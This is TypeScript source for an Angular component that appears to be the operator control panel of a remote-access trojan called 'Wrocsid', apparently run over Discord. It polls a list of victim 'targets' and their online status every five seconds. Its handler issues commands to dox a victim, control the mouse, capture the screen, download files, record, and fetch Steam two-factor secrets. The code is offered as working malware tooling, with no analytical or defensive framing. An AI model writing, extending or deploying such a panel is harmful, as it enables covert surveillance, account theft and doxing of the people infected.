import { Component, OnInit } from '@angular/core';
import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';
import { Observable, firstValueFrom } from 'rxjs';
import {
  AbstractControl,
  FormBuilder,
  FormControl,
  FormGroup,
  ValidationErrors,
  ValidatorFn,
  Validators,
  FormsModule,
  ReactiveFormsModule,} from '@angular/forms';

@Component({
  selector: 'app-body',
  templateUrl: './body.component.html',
  styleUrls: ['./body.component.css']
})
export class BodyComponent implements OnInit {

  private panelOpenState: boolean = false
  public targets: any = undefined
  mouseForm!: FormGroup
  recordForm!: FormGroup
  downloadForm!: FormGroup
  disabled: boolean = true
  path: string = ""

  constructor(private wrocsid:WrocsidService, private fb: FormBuilder) {}

  async ngOnInit(): Promise<void> {
    this.mouseForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.recordForm = this.fb.group({
      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
      timeUnits: ['s']
    })

    this.downloadForm = this.fb.group({
      path: ['', [Validators.required, Validators.minLength(6)]],
    })

    let temp_targets
    this.targets = await firstValueFrom(this.wrocsid.get_targets_data())

    while(true) {
      await this.delay(5 * 1000)
      temp_targets = await firstValueFrom(this.wrocsid.get_targets_data())
      if(!temp_targets) {
        continue
      }
      if(!this.check_if_targets_equal(this.targets, temp_targets)) {
        this.targets = temp_targets
      }
    }
  }

  timeControlValidation(control: AbstractControl) {
    if (Number(control.value) <= 0) {
      return { invalidTimeAmount: true };
    }
    return null;
  }

  getPath(form: FormGroup) {
    return String(form.controls['path'].value)
  }

  concatTime(form: FormGroup) {
    return String(form.controls['timeAmount'].value).concat(form.controls['timeUnits'].value)
  }

  changeInputFormState() {
    this.disabled = !this.disabled
  }


  delay(ms: number) {
    return new Promise( resolve => setTimeout(resolve, ms) );
  }

  check_if_targets_equal(targets: any, temp_targets: any) {
    if(targets.length != temp_targets.length) return false

    for(let i = 0; i < targets.length; i++) {
      if(targets[i].channel_id != temp_targets[i].channel_id) return false
      if(targets[i].identifier != temp_targets[i].identifier) return false
      if(targets[i].metadata != temp_targets[i].metadata) return false
      if(targets[i].online != temp_targets[i].online) return false
    }

    return true
  }

  changePanelState() {
    this.panelOpenState = !this.panelOpenState
  }

  wrocsidHandler(command: string, identifier: any, args?: any) {
    switch (command) {
      case 'dox':
        this.wrocsid.dox(identifier)
        break;
      case 'mouse':
        this.wrocsid.mouse(identifier, args)
        break;
      case 'screen':
        this.wrocsid.screen(identifier)
        break;
      case 'download':
        this.wrocsid.download(identifier, args)
        break;
      case 'record':
        this.wrocsid.record(identifier, args)
        break;
      case 'getSteam2fa':
        this.wrocsid.getSteam2fa(identifier)
        break;
    }
  }
}

